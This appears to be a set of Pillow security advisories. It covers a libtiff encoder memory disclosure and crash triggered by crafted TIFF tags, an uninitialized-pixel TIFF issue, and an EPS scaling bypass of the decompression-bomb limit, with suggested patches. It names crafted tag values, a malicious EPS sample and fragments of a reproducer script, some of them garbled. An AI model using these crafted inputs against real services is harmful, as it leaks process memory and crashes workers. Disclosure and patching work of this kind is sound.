Vulnerabilities.Description: Pillow is a Python imaging library. From 5.3.0 until 13.0.0, Pillow can return uninitialized memory as pixels when libtiff performs a short decode of JPEG-compressed or Group 4 fax TIFF data. The _decodeStrip and _decodeTile buffers can be larger than the bytes written by libtiff, but Pillow converts the expected rows without clearing the unwritten tail. The tile path is affected from 5.3.0 and the strip path from 6.0.0. An attacker can supply a crafted TIFF to an application that loads and returns or re-encodes its pixels. This can disclose stale heap contents without memory corruption or a process crash. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: Pillow: Memory disclosure and segfault in libtiff encoder via crafted TIFF tags
Vulnerabilities.Description:
```
============================================================================
Memory disclosure and segfault in libtiff encoder via crafted TIFF tags
Location: src/encode.c:1014  in PyImaging_LibTiffEncoderNew()
Commit:   a707c6b21c313880d0771e54965d142dd42358b6
============================================================================
```

A crafted TIFF file of a few hundred bytes makes Pillow copy an attacker-chosen amount of its own process memory into the TIFF it writes back out, or crash the process outright. The trigger is an ordinary `Image.open()` followed by a bare `im.save(fp, "TIFF")`. The only precondition is that the application re-saves images as TIFF. When the uploaded file is compressed, Pillow routes that save through libtiff automatically, with no options from the application. The attached reproducer does this with a 356-byte LZW TIFF: one crafted tag comes back holding 65536 bytes taken from `_imaging.so`'s read-only data, and a second crafted tag makes the worker die with SIGSEGV on every run.

The bug is in `PyImaging_LibTiffEncoderNew` (`src/encode.c`). It decides what arguments to pass to the variadic `TIFFSetField()` from the shape of the Python value (scalar, tuple or bytes). It assumes its `ImagingLibTiffMergeFieldInfo()` call defined how libtiff will read them. But `TIFFMergeFieldInfo()` never overrides libtiff's built-in field table, so libtiff reads the arguments according to its own definition of the tag:

- For a counted array tag such as DNGPrivateData (50740), a count-1 integer in the source file is taken as the byte count. The data pointer is then read from an argument slot Pillow never wrote, and that many bytes are copied into the output.
- For a fixed-size array tag such as ActiveArea (50829), the integer itself is used as the source address.

Where that unwritten slot points depends on the compiler. In the tested clang build it points into `_imaging.so`, and a larger count returned thousands of pointers into libpython, libc and libtiff, which defeats address-space randomisation for anyone chaining another bug. When the application preserves metadata with `tiffinfo=im.tag_v2`, a 64-bit entry turns ActiveArea into a 16-byte read from an address the attacker chooses. All observed memory errors are reads; no out-of-bounds write was found.

Other branches of the same loop share the defect and are reachable from crafted TIFFs or from EXIF in JPEG/PNG/WebP re-saved as compressed TIFF. These are the `bytes`, RATIONAL-tuple and typed-tuple branches, and a BYTE-typed ColorMap. The file-reachable forwarding was introduced in `a3d45e9cefd0` ("Added custom int and float TIFF tags") and first released in 5.4.0.

## Details

`PyImaging_LibTiffEncoderNew` (`src/encode.c:777-1060`) chooses the argument
list it hands to the variadic `TIFFSetField()` from the *Python* value of each
tag — scalar vs. tuple vs. `bytes`, and a type that is either autodetected or
copied from the source file's IFD — and assumes that its own
`ImagingLibTiffMergeFieldInfo()` registration defines how libtiff will read the
`va_list`. It does not: libtiff keeps its built-in definition for every tag it
already knows, and core tags are never registered at all. libtiff therefore
consumes the varargs as `(count, pointer)`, `(pointer)` or three pointers
according to *its* field table, whatever Pillow actually pushed. The encoder
never consults that table (`TIFFFindField` / `TIFFFieldPassCount` /
`TIFFFieldWriteCount` / `TIFFFieldDataType`) before the call.

The most severe instance, and the one the attached reproducer exercises: when a
TIFF is re-saved through the libtiff writer, every tag of the source IFD that
Pillow does not recognise is forwarded to libtiff with `TIFFSetField()`. A
count-1 integer entry is passed as a single scalar vararg. If libtiff's own
field table defines that tag number as an *array* field, libtiff consumes the
varargs as `(count, pointer)` or `(pointer)` instead, so the attacker's integer
becomes either the number of bytes to copy from a never-written vararg slot, or
the source address itself. The same mismatch is reachable through the typed
tuple branches (tuple length consumed as a pointer for fixed-count built-in
tags such as `CFARepeatPatternDim`, even when the source file is well-formed),
the `bytes`, `TIFF_RATIONAL`-tuple and core-tag branches of the same loop;
those are listed
under *Other branches with the same defect* below and need to be covered by the
same fix.

A 181-byte TIFF (16×16 RGB, one LZW strip, plus one extra IFD entry
`50740 / LONG / count 1 / value 4096` — DNGPrivateData) opened with
`Image.open()` and saved with a bare `im.save(buf, "TIFF")` produces a 4296-byte
output whose tag 50740 holds 4096 bytes that occur nowhere in the input; scanning
`/proc/self/mem` finds them in the read-only data segment of `_imaging.so`.
Changing the extra entry to `50829 / LONG / 1 / 64` (ActiveArea) makes the same
two calls segfault in `memcpy(dst, src=0x40, n=16)` under
`ImagingLibTiffSetField` ← `PyImaging_LibTiffEncoderNew`. An ASan build of the
extensions reports `READ of size 4096` in `memcpy` called from
`src/encode.c:1014` for the first input.

### Code path

`_save` copies all tags of the opened image into the libtiff attribute list.
For a tag that is neither in `LIBTIFF_CORE` nor in `TiffTags.TAGS_V2`, no type
is recorded, so the value goes through untyped:

```python
# src/PIL/TiffImagePlugin.py:1782
supplied_tags = {**legacy_ifd, **getattr(im, "tag_v2", {})}
…
# :1959-1982
for tag, value in itertools.chain(ifd.items(), supplied_tags.items()):
    if tag not in TiffTags.LIBTIFF_CORE:
        …
        elif isinstance(value, (int, float, str, bytes)) or …:
            type = TiffTags.lookup(tag).type      # None for 50740, 50829, …
            if type:
                types[tag] = type
    if tag not in atts and tag not in blocklist:
        …
            atts[tag] = value                     # plain int 4096
```

`compression` defaults to the source image's `im.info["compression"]`
(`TiffImagePlugin.py:1731-1746`), so a compressed source selects the libtiff
writer without the application asking for it.

In the encoder the untyped `int` is autodetected as `TIFF_LONG`
(`src/encode.c:805-815`), the tag is "registered" as a scalar custom field, and
then set with one 32-bit vararg:

```c
// src/encode.c:844      (is_var_length = 0 → writecount 1, passcount 0)
if (ImagingLibTiffMergeFieldInfo(&encoder->state, type, key_int, is_var_length)) {
    … continue;
}
…
// src/encode.c:1013-1016
} else if (type == TIFF_LONG || type == TIFF_IFD) {
    status = ImagingLibTiffSetField(
        &encoder->state, (ttag_t)key_int, (UINT32)PyLong_AsLong(value)
    );
```

The registration does not do what the caller assumes. `TIFFMergeFieldInfo()`
only adds definitions for tags libtiff does not already know and returns 0
(success) either way, so for tags in libtiff's built-in table the built-in
definition stays in force. Queried against the linked libtiff 4.5.0 after
exactly Pillow's merge call:

```
50740 DNGPrivateData      type=BYTE   passcount=1 writecount=-1   (unchanged)
50829 ActiveArea          type=LONG   passcount=0 writecount=4    (unchanged)
65000 CustomField         type=LONG   passcount=0 writecount=1    (Pillow's definition, tag was unknown)
```

libtiff's setter for `FIELD_CUSTOM` tags then interprets the `va_list`
according to *its* definition: for `passcount=1` it reads `va_arg(ap, int)` as
the element count — the attacker's 4096 — allocates `count * size` bytes and
`memcpy`s that many bytes from `va_arg(ap, void *)`, a slot
`PyImaging_LibTiffEncoderNew` never wrote. On x86-64 that slot is register
`rcx`; in this build it holds a pointer into `_imaging.so`'s `.rodata`, so the
copy succeeds deterministically (a value of 2 000 000 also succeeds and yields a
2 000 200-byte output). `TIFFWriteDirectory` writes the copied bytes into the
output file as the tag's value. For fixed-count array fields (`passcount=0`,
`writecount=4` for ActiveArea) there is no count argument, so the attacker's
scalar is consumed as the `void *` source and 16 bytes are read from address
64 → SIGSEGV.

Tags in libtiff 4.5's built-in table that Pillow forwards untyped and that take
the `(count, pointer)` form include DNGPrivateData 50740, CFAPattern 33422,
CFAPlaneColor 50710, LinearizationTable 50712, BlackLevel 50714, WhiteLevel
50717, ColorMatrix1/2 50721/50722, AsShotNeutral 50728, OriginalRawFileName/Data
50827/50828, AsShotICCProfile 50831, CurrentICCProfile 50833. Fixed-count ones
(pointer only → crash) include ActiveArea 50829, DNGVersion/DNGBackwardVersion
50706/50707, DefaultScale/DefaultCropOrigin/DefaultCropSize 50718–50720,
AsShotWhiteXY 50729, CFARepeatPatternDim 33421, BlackLevelRepeatDim 50713,
ImageLayer 34732, RawDataUniqueID 50781.

When the application saves with `tiffinfo=im.tag_v2` (the documented way to
preserve metadata), the file-declared type is honoured, and a `LONG8` entry
reaches the `(uint64_t)PyLong_AsLongLong(value)` branch at
`src/encode.c:1049-1052`. For ActiveArea that is a 16-byte read from a full
64-bit attacker-chosen address into the output: a source entry
`50829 / LONG8 / 1 / <address of a Python bytes object>` produced an output
ActiveArea of `(b'SECR', b'ET-T', b'OKEN', b'-012')` in testing.

The comment above `blocklist +=` at `TiffImagePlugin.py:1938-1944` already notes
that array tags with the wrong length "will result in segfaults"; the blocklist
covers only a handful of tags Pillow itself knows, not the ones libtiff knows and
Pillow does not. Forwarding of these tags was introduced in `a3d45e9cefd0`
("Added custom int and float TIFF tags", 2018-10-25), first released in 5.4.0;
releases 2.0.0–3.0.0 forwarded them as scalars too, until `9fa6634f4`
("Partial fix for #1597") limited `_save` to `LIBTIFF_CORE`.

### Other branches with the same defect

The scalar-integer branch above is one of several places in the same loop
where the call shape is derived from the Python value rather than from
libtiff's definition. All of the following were confirmed on this commit (stock
build crashes and/or ASan reports, stack always `memcpy ← libtiff ←
ImagingLibTiffSetField src/libImaging/TiffDecode.c:934 ←
PyImaging_LibTiffEncoderNew`), and all are reachable from a sub-1 KB crafted
file followed by an ordinary `save()`:

* **Typed tuple → `(len, av)` for a fixed-count built-in field**
  (`src/encode.c:904-994`, the SHORT/LONG/SBYTE/SSHORT/SLONG/FLOAT/DOUBLE
  tuple branches all call `ImagingLibTiffSetField(..., len, av)`). For libtiff
  built-in fields with `passcount=0` and a fixed `writecount` —
  `CFARepeatPatternDim` 33421 (SHORT×2), `BlackLevelRepeatDim` 50713
  (SHORT×2), `ImageLayer` 34732 (LONG×2), `ActiveArea` 50829 (LONG×4),
  `MatrixWorldToScreen/Camera` 33305/33306 (FLOAT×16) — libtiff takes the
  *first* vararg as the source pointer, so the tuple length becomes the
  `memcpy` source address. A perfectly well-formed 206-byte 8×8 PackBits TIFF
  carrying `33421 / SHORT / 2 / (2, 2)` re-saved with a bare
  `im.save(out, "TIFF")` dies with SIGSEGV in `memcpy` (gdb: `rsi = 0x2`, the
  tuple length) on every run; so does
  `Image.new("L", (8, 8)).save(buf, "TIFF", compression="packbits",
  tiffinfo={33421: (2, 2)})`, and a JPEG whose EXIF carries the tag saved with
  `exif=im.getexif()` into a compressed TIFF. `bytes` values for built-in
  fixed-count BYTE tags (e.g. `DNGVersion` 50706, BYTE×4) crash the same way
  through the `(PyBytes_Size, PyBytes_AsString)` call at `src/encode.c:860-865`.
  The mirror image for `passcount=1` fields: `Photoshop` 34377 declared
  SHORT, count 1, value 60000 takes the scalar branch at `:1009-1012`, libtiff
  reads 60000 as the count and an unpassed vararg as the pointer, and the
  re-save *succeeds* with a 60162-byte output whose tag 34377 holds 60000 bytes
  of process memory (here C prototype strings from `_imaging.so`'s `.rodata`).
* **`bytes` value → single `char *`** (`src/encode.c:805-815` autodetects
  `bytes` as `TIFF_ASCII`; `:1033-1042` passes `PyBytes_AsString(value)` alone).
  `ImageFileDirectory_v2._setitem` stores a BYTE-typed entry as bare `bytes`
  and an ASCII-typed one as `str` (encoded to `bytes` by `_save`), so the
  file's declared type selects this branch.
  - `ColorMap` (320) declared BYTE with 4 bytes of data in a non-palette
    PackBits TIFF: 320 is in `core_tags[]`, no type is consulted, the value
    skips the 768-tuple `TIFFTAG_COLORMAP` branch (`:871-895`) and libtiff reads
    three `uint16_t *` and copies `1 << BitsPerSample` shorts from each — a
    512-byte over-read of the 5-byte Python bytes buffer, then dereference of
    two stale argument registers → SIGSEGV on every run of
    `Image.open(f); im.save(out, "TIFF")`. `COLORMAP` is not in `_save`'s
    `blocklist`.
  - `Photoshop` (34377) declared ASCII: `_save` copies value *and* type
    (`TiffImagePlugin.py:1802-1818`; only `IPTC_NAA_CHUNK` has a BYTE/UNDEFINED
    type guard there, from commit 2245df0a — `PHOTOSHOP_CHUNK` and `XMP` do
    not). libtiff's definition is BYTE, `passcount=1`, so the low 32 bits of
    the `char *` become the byte count for a `memcpy` from a stale register
    (ASan: `READ of size 3518384`; stock: SIGSEGV in about half of runs,
    otherwise `RuntimeError`). `ICCProfile` (34675) declared ASCII behaves the
    same way via `im.info["icc_profile"]` → `ifd[ICCPROFILE]`
    (`TiffImagePlugin.py:1822-1824`).
* **`TIFF_RATIONAL` tuple → array with no count** (`src/encode.c:995-1006`;
  compare the `TIFF_FLOAT` branch at `:969-981`, which passes `len, av`).
  - For a private tag (e.g. 50000) Pillow itself registers the field with
    `passcount=1` (`TiffDecode.c:904-908`), so libtiff takes the low 32 bits of
    `av` as the element count and the next stale vararg as the source:
    `heap-buffer-overflow READ of size 119872 … right of 8-byte region` under
    ASan (`119872 == 4 * low32(av)`), SIGSEGV in ~4 of 5 stock runs. Reached by
    a JPEG whose EXIF carries one private RATIONAL×2 tag saved with
    `im.save(out, "TIFF", compression="tiff_lzw", exif=im.info["exif"])`, or a
    TIFF re-saved with `tiffinfo=im.tag_v2` (`_setitem` auto-types a tuple of
    `IFDRational` as RATIONAL, `TiffImagePlugin.py:689-701`; `types[tag] =
    ifd.tagtype[tag]` at `:1968`).
  - For libtiff's built-in fixed-count float tags `WhitePoint` (318, 2),
    `PrimaryChromaticities` (319, 6) and `YCbCrCoefficients` (529, 3), which
    `_save` forwards from any source TIFF and types RATIONAL via
    `TiffTags.lookup`, the pointer-only convention happens to match, but
    libtiff copies its *fixed* count from an array that is only as long as the
    file declared: a PackBits TIFF with `PrimaryChromaticities` count 1 and a
    bare `im.save(out, "TIFF")` gives `READ of size 24 … right of 4-byte
    region`, and the over-read floats are written to tag 319 of the output.
    `REFERENCEBLACKWHITE`/`TRANSFERFUNCTION` are blocklisted at
    `TiffImagePlugin.py:1941-1952` for exactly this reason; 318/319/529 are not.
* **Core tag reached as a scalar via a stale file-supplied type.** With the
  re-save idiom `im.save(out, "TIFF", tiffinfo=im.tag_v2)`, `_save` copies
  `ifd.tagtype[key] = info.tagtype[key]` for every key
  (`TiffImagePlugin.py:1768-1776`) and later assigns its own values to some of
  the same tags without resetting the type (`ifd[COLORMAP] = colormap` at
  `:1870-1877`; likewise BitsPerSample, SamplesPerPixel, ExtraSamples,
  ICCProfile, …). For a 418-byte PackBits *palette* TIFF whose ColorMap entry
  is declared BYTE, `_setitem` (`:751-770`) truncates `_save`'s 768-entry
  palette to a single `int` (with only a "too many entries" warning), the
  encoder receives `(320, 0)`, autodetects `TIFF_LONG`, and
  `src/encode.c:1013-1016` calls `TIFFSetField(TIFFTAG_COLORMAP, (UINT32)0)` —
  libtiff reads three `uint16_t *` and faults at an address ≤ 65280 on every
  run. The stale-tagtype copy is a Python-side hygiene bug in its own right,
  but its memory-safety consequence exists only because the encoder lets a
  non-tuple value reach `TIFFSetField(COLORMAP)`.

## Impact

Any service that accepts a TIFF and writes it back out as TIFF through libtiff —
which happens with a plain `im.save(fp, "TIFF")` whenever the uploaded file is
compressed, or whenever a `compression=` other than raw is requested — returns
to the uploader, inside one metadata tag of the produced file, an
attacker-chosen number of bytes read from a stale pointer in the worker process,
deterministically and without retries. Which memory that is depends on the
compiler's register allocation for `PyImaging_LibTiffEncoderNew`: in this clang
build the pointer is `_imaging.so + 0x1588`, so a request for 262 144 bytes
(which succeeded every time in testing, as did 2 000 000) covers the

## Reproducing

`repro` is one Python script, run against the stock build with the installed `PIL`. It needs no compiler and no extra files.

`upload(tag, value)` has Pillow write a 16×16 red RGB image as an LZW-compressed TIFF, then appends a new IFD holding the same entries plus one extra `<tag> / LONG / count 1 / value` (kept in tag order) and points the header at it — a 356-byte input on this tree. The source is LZW-compressed on purpose. A bare `im.save(out, "TIFF")` keeps the source's compression, so the save goes through the libtiff writer even though the application passes no arguments. `resave()` is the whole "application": `Image.open(BytesIO(src)); im.save(out, "TIFF")`.

The script runs three cases:

1. **Control, tag 65000 = 4096.** libtiff does not know this tag, so the file is re-saved correctly and the output tag reads back as the integer `4096`. This is what should happen to every tag.
2. **Leak, DNGPrivateData 50740 = 65536.** libtiff's built-in definition of this tag is a counted BYTE array. It reads Pillow's single scalar as the *count* and takes the data pointer from a vararg slot Pillow never wrote. The output tag comes back as `bytes` of length 65536 that do not occur in the input. The script prints the first 32 of them and the file offset at which they occur in `_imaging.so` on disk. On this build they always do (offset `0x57588`): the stale pointer aims into the extension's read-only data.
3. **Wild read, ActiveArea 50829 = 64.** libtiff defines this tag as a fixed LONG[4] array with no count, so it uses the scalar 64 as the *source address*. The script re-runs itself as a child process (`repro child`, core dumps disabled) to do this re-save, and the child exits with `-11`, meaning SIGSEGV.

Expected output on the affected tree:

```
control  tag 65000=4096 -> 4096
leak     tag 50740=65536 from a 356-byte upload -> 65536 bytes not present in input, head a661fcffc661fcff3360fcff7b61fcffd361fcff085ffcffe061fcff3360fcff
         leaked bytes found in _imaging.so at file offset 0x57588
crash    tag 50829=64 -> child exit -11 (SIGSEGV)
BUG
```

The script prints `BUG` if case 2 leaks or case 3 crashes. Both are deterministic on this build. A fixed Pillow prints `OK`: the tag does not come back as 65536 bytes of foreign data (it reads back as `None`, or `save()` raises `ValueError`/`RuntimeError`, which the script catches), and the child exits with something other than SIGSEGV (0, or 1 if `save()` raised).

The other branches can be checked by hand on the stock build in the same way
(each as `Image.open(f); im.save(BytesIO(), "TIFF")` in a child process):
a PackBits RGB TIFF with an extra IFD entry `320 / BYTE / 4 / "ABCD"` →
SIGSEGV every run; a PackBits palette TIFF whose ColorMap is `320 / BYTE / 2`
saved with `tiffinfo=im.tag_v2` → SIGSEGV every run; a Pillow-written JPEG
whose EXIF holds tag 50000 = RATIONAL×2 saved with
`compression="tiff_lzw", exif=im.info["exif"]` → SIGSEGV in most runs,
`RuntimeError` ("Failed to allocate memory for custom tag binary object
(-N elements of 4 bytes each)") in the rest.

## Suggested fix

The encoder must not guess the calling convention; it has to ask libtiff what
the tag's effective definition is *after* `ImagingLibTiffMergeFieldInfo` and
marshal accordingly, or refuse. The attached patch does this for non-core tags:

* a new `ImagingLibTiffFindField()` in `src/libImaging/TiffDecode.c` (declared
  in `TiffDecode.h`, next to the other libtiff wrappers) returns libtiff's
  `TIFFFindField` type, `passcount` and `writecount` for a tag;
* in `PyImaging_LibTiffEncoderNew` (`src/encode.c`), for a non-core tag that
  libtiff already knows, Pillow adopts libtiff's type when it has none of its
  own, and after `ImagingLibTiffMergeFieldInfo` a new `tiff_field_matches()`
  checks the value against libtiff's definition: a scalar only for a
  single-value field whose C argument type (int / `uint64_t` / double /
  `char *`) matches, an array only with libtiff's element size and, for
  fixed-count fields, exactly `writecount` elements. Anything else raises
  `ValueError("Tag value does not match libtiff field definition")` instead of
  reaching `TIFFSetField` — this covers the reproducer's DNGPrivateData and
  ActiveArea inputs, ASCII-typed Photoshop, short PrimaryChromaticities and the
  `LONG8` `tiffinfo=` variant;
* every tuple/`bytes` branch now goes through `set_tiff_array_field()`, which
  passes `len` only when the field has `passcount` set; this also fixes the
  `TIFF_RATIONAL` branch, which never passed a count (and extends it to
  `TIFF_SRATIONAL`);
* `TIFF_UNDEFINED` fields are registered as variable-length, matching how their
  `bytes` values are passed;
* `Tests/test_file_libtiff.py` gains a regression test (scalar DNGPrivateData,
  scalar and 2-tuple ActiveArea rejected; well-formed values round-trip).

Core tags and tags libtiff does not know keep their current behaviour. With the
patch applied to a clean checkout and rebuilt, the reproducer no longer
triggers and the test suite passes. It is not a complete fix, however: the
whole check sits inside `if (!is_core_tag)`, so the BYTE-typed ColorMap variant
stays open. The PackBits RGB TIFF carrying `320 / BYTE / 4`, re-saved with a
bare `save()`, no longer segfaults at this point but writes 1536 bytes —
over-read from the 5-byte `bytes` object and two stale varargs, including 22
live heap pointers — into the output ColorMap, which is still a disclosure.
Before merging, it needs a guard that accepts `TIFFTAG_COLORMAP` only through
the existing 768-tuple branch, never through the scalar or `bytes` branches,
and ideally the same shape check for the other core tags libtiff special-cases
in `_TIFFVSetField` (YCbCrSubsampling 530, TransferFunction 301,
ReferenceBlackWhite 532).

Narrower Python-side mitigations in `_save` close individual entry points but
not the class, and are worth adding alongside the C-side check: drop tags
with `TiffTags.lookup(tag).type is None` from `supplied_tags` (closes the `Image.open()→save()` path shown here but not
`tiffinfo=` callers); remove `COLORMAP` from `supplied_tags` next to
`EXIFIFD`/`SAMPLEFORMAT` and extend the `IPTC_NAA_CHUNK` BYTE/UNDEFINED type
guard to `PHOTOSHOP_CHUNK` and `XMP`; add 318/319/529 to the blocklist next to
`REFERENCEBLACKWHITE`; and have `_save` `ifd.tagtype.pop(tag, None)` before
assigning its own ColorMap/BitsPerSample/ICCProfile/… values so a
`tiffinfo=`-imported type cannot reshape them. The C-side check is the fix to
rely on.

    return bytes(data)

def resave(src):                       # the whole "service"
    im = Image.open(io.BytesIO(src)); out = io.BytesIO(); im.save(out, "TIFF")
    return out.getvalue()

if len(sys.argv) > 1 and sys.argv[1] == "child":
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
    resave(upload(50829, 64)); sys.exit(0)

print("PIL core:", Image.core.__file__)
ctl = Image.open(io.BytesIO(resave(upload(65000, 4096)))).tag_v2.get(65000)
print("control  tag 65000=4096 ->", repr(ctl))

N = 65536
src = upload(50740, N)
try:

except (ValueError, RuntimeError) as e:   # a fixed Pillow may reject the tag
    v = e
leak = isinstance(v, bytes) and len(v) == N and v[:64] not in src

      f"{len(v)} bytes not present in input, head {v[:32].hex()}" if leak else repr(v)[:80])

    so = open(Image.core.__file__, "rb").read()

rc = subprocess.call([sys.executable, __file__, "child"])
crash = rc in (-11, 139)
print("crash    tag 50829=64 -> child exit", rc, "(SIGSEGV)" if crash else "")

Vulnerabilities.Title: Pillow: EPS load(scale) lets Ghostscript render past the decompression bomb limit
Vulnerabilities.Description:
``` ============================================================================ EPS load(scale) lets Ghostscript render past the decompression bomb limit Location: src/PIL/EpsImagePlugin.py:92 in Ghostscript() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` When an application opens an untrusted Encapsulated PostScript file and asks Pillow to render it at a larger scale, Pillow has Ghostscript produce an image several times bigger than Pillow's configured size limit allows. The size check runs only after Ghostscript has finished rendering and written the full raw image to a temporary file. An attacker who can upload a file of about 100 bytes makes each such request spend scale² times the Ghostscript rendering work and temporary disk space that the limit is meant to permit. For example, at scale 2 that is a 972 MB temporary file. The cause is in `Ghostscript()` in `src/PIL/EpsImagePlugin.py`. It multiplies the file-declared size by the caller's `scale` (lines 93-94) and passes the product to `gs` as the `-g` output geometry. It never calls `Image._decompression_bomb_check()` on the scaled size. The only check is the one `Image.open()` ran on the unscaled size, so a file declaring 9000×9000 passes, and `load(scale=2)` then asks Ghostscript for 18000×18000 (3.6× `MAX_IMAGE_PIXELS`). A file declaring 18000×18000 directly would be refused before Ghostscript ever ran. `DecompressionBombError` fires only when Pillow reopens the output file, so Pillow's own in-process allocation stays bounded and there is no memory corruption. The effect is a constant-factor overshoot rather than an unbounded one, for three reasons: * The multiplier is an integer chosen by the application, not by the file. * With the default warning filter, `Image.open()` already lets files up to 2× the limit reach Ghostscript at `scale=1`. * Any application feeding untrusted files to Ghostscript is already exposed to a tiny file that keeps Ghostscript busy indefinitely, since `gs` runs with no timeout. This is the EPS counterpart of the WMF `load(dpi)` gap closed in af70b075a. It has been present since the decompression-bomb limit was introduced in ce2955ec7 (2.5.0). The attached reproducer stubs out Ghostscript and shows a 76-byte file passing `Image.open()` and reaching `gs` with `-g18000x18000`. A one-line patch mirroring the WMF check is included. ## Details `EpsImageFile.load(scale=N)` (the documented way to rasterise an EPS at higher resolution) renders `width*N × height*N` pixels through Ghostscript, but the only decompression-bomb check on the way is the one `Image.open()` ran on the *unscaled*, file-declared `width × height`. The scaled product is never passed to `Image._decompression_bomb_check()` before `gs` is started. This 111-byte EPS declares 9000×9000 = 81,000,000 pixels, below the default `MAX_IMAGE_PIXELS` (89,478,485), so `Image.open()` accepts it without even a warning: ``` %!PS-Adobe-3.0 EPSF-3.0 %%BoundingBox: 0 0 9000 9000 %%EndComments 0 0 moveto 9000 9000 lineto stroke showpage ``` `im.load(scale=2)` on it then executes ``` gs -q -g18000x18000 -r144.000000x144.000000 -dBATCH -dNOPAUSE -dSAFER -sDEVICE=pnmraw -sOutputFile=/tmp/tmpXXXX -c 0 0 translate -f attack.eps -c showpage ``` i.e. asks Ghostscript for an 18000×18000 = 324,000,000-pixel raster (3.6× `MAX_IMAGE_PIXELS`), whose `pnmraw` output is a 972,000,019-byte file in the temp directory. An EPS that declares 18000×18000 directly is rejected by `Image.open()` with `DecompressionBombError` before Ghostscript is ever run; via `scale=2` the same raster is rendered first and the `DecompressionBombError` only appears afterwards, when Pillow opens the file Ghostscript produced. (Between 1× and 2× `MAX_IMAGE_PIXELS`, `Image.open()` only emits `DecompressionBombWarning`, so with the default warning filter an EPS declaring e.g. 13377×13377 is already rendered at `scale=1` — a 537 MB PNM. Against that baseline, `scale=2` is 4× an already-permitted render.) The arithmetic is in `Ghostscript()`: ```python # src/PIL/EpsImagePlugin.py:91-97 # Hack to support hi-res rendering scale = int(scale) or 1 width = size[0] * scale height = size[1] * scale # resolution is dependent on bbox and size res_x = 72.0 * width / (bbox[2] - bbox[0]) … # src/PIL/EpsImagePlugin.py:139-142 command = [ gs_binary, "-q", # quiet mode f"-g{width:d}x{height:d}", # set output geometry (pixels) … # src/PIL/EpsImagePlugin.py:165-168 subprocess.check_call(command, startupinfo=startupinfo) with Image.open(outfile) as out_im: out_im.load() return out_im.im.copy() ``` and its caller does nothing between taking `scale` from the application and invoking it: ```python # src/PIL/EpsImagePlugin.py:411-417 def load(self, scale: int = 1, transparency: bool = False) -> …: # Load EPS via Ghostscript if self.tile: assert self.fp is not None self.im = Ghostscript(self.tile, self.size, self.fp, scale, transparency) ``` `size` here is `self._size`, computed in `_open()` from the file's `%%BoundingBox` (or `%ImageData`) and checked once by `Image.open()` at `src/PIL/Image.py:3700`. For the benign path (`scale=1`) that check covers exactly what Ghostscript is asked to render. For `scale=N` the rendered pixel count is N² times what was checked, so a file can sit just under the limit at open time and have Ghostscript render 4× (scale 2), 9× (scale 3), 16× (scale 4) the configured budget. The first point at which Pillow looks at the real size again is `Image.open(outfile)` at line 166 — after `subprocess.check_call` has returned, i.e. after Ghostscript has spent the CPU and written `width*height*3` bytes to `tempfile.mkstemp()`'s directory. `WmfStubImageFile.load(dpi)` has the same shape (file-derived extent × caller-supplied factor → new raster) and, since af70b075a, calls `Image._decompression_bomb_check(self.size)` on the recomputed size before rendering (`src/PIL/WmfImagePlugin.py:127-131`). The EPS path lacks the equivalent line. The gap dates from ce2955ec7128 ("Throw an exception when an opened image is larger than an arbitrary limit", 2014-05-14, first released in 2.5.0), which added the check to `Image.open()` without covering the `scale` path. ## Impact Affected are applications that open untrusted EPS/PS with Ghostscript installed and call `load(scale=N)` with a fixed N > 1, as the handbook suggests for non-blurry output. Handing untrusted EPS to Ghostscript at all already lets the same attacker tie up a worker with an equally tiny file (e.g. a PostScript `{} loop`; Pillow runs `gs` with no timeout), so this bug adds a constant factor rather than a new denial-of-service capability. Within that setting, a ~110-byte upload makes each request run Ghostscript over N² × `MAX_IMAGE_PIXELS` pixels (N² × 2·`MAX_IMAGE_PIXELS` if the application does not turn `DecompressionBombWarning` into an error) and write a `W·H·3`-byte PNM into the temp directory — 972 MB for the example above at scale 2, 2.2 GB at scale 3, 8.6 GB for a 178-Mpixel declaration at scale 4 — before any limit is applied. The operator's `MAX_IMAGE_PIXELS` setting is exceeded by a factor of N²; N is an integer chosen by the application, not by the file, so the work stays bounded at N² × 2·`MAX_IMAGE_PIXELS`. The consequence is N² more Ghostscript CPU and temp-disk use per request than the configured limit intends; Pillow's own in-process pixel allocation remains bounded because `Image.open(outfile)` re-checks the PNM's size, and there is no memory corruption. This is a sibling of the WMF `load(dpi)` issue fixed in af70b075a ("Add decompression bomb check when loading at a different DPI"); the EPS `scale` path was not covered by that change. Unlike the WMF case, where the file-controlled `_inch` makes the ratio unbounded, the EPS multiplier is fixed by the application. ## Reproducing Run `repro` against the installed Pillow. Ghostscript does not need to be installed: the script sets `EpsImagePlugin.gs_binary = "gs"` so that `has_ghostscript()` skips its `gs --version` probe, and replaces `subprocess.check_call` with a function that records the command line Pillow builds and then raises `OSError`, so nothing is actually rendered. It writes a 76-byte EPS declaring `%%BoundingBox: 0 0 9000 9000` (the example above without the drawing line; 81 Mpixel, below the default `MAX_IMAGE_PIXELS` of 89,478,485) and turns `DecompressionBombWarning` into an error, so any bomb check — warning or hard error — counts. It then calls `Image.open()` and `im.load(scale=2)`. `Image.open()` accepts the file and `load(scale=2)` reaches the intercepted Ghostscript call with `-g18000x18000` (324,000,000 pixels, 3.6× `MAX_IMAGE_PIXELS`, a 972 MB `pnmraw` output with real Ghostscript). The script prints the geometry it captured. It prints `BUG` when Ghostscript was invoked with a `-g` geometry above `2*MAX_IMAGE_PIXELS` (178,956,970) and no decompression-bomb check fired before that call; otherwise it prints `OK`. With the attached patch applied, `load(scale=2)` raises `DecompressionBombError` before Ghostscript is called and the script prints `OK`. ## Suggested fix The attached patch checks the scaled size in `Ghostscript()` right after the scaled `width`/`height` are computed (`src/PIL/EpsImagePlugin.py:93-94`) and before the `gs` command is built, mirroring `WmfStubImageFile.load`: ```diff --- a/src/PIL/EpsImagePlugin.py +++ b/src/PIL/EpsImagePlugin.py @@ -92,6 +92,7 @@ def Ghostscript( scale = int(scale) or 1 width = size[0] * scale height = size[1] * scale + Image._decompression_bomb_check((width, height)) # resolution is dependent on bbox and size res_x = 72.0 * width / (bbox[2] - bbox[0]) res_y = 72.0 * height / (bbox[3] - bbox[1]) ``` `load(scale=N)` now raises `DecompressionBombError` / emits `DecompressionBombWarning` under the same `MAX_IMAGE_PIXELS` thresholds `Image.open()` applies, before Ghostscript runs instead of after. Placing the check in `Ghostscript()` rather than in `EpsImageFile.load()` is the single point where the rendered extent is decided, so it also covers direct callers of the module-level function. With the patch applied to a clean checkout the reproducer prints `OK` and `Tests/test_file_eps.py` passes. One cosmetic side effect: at 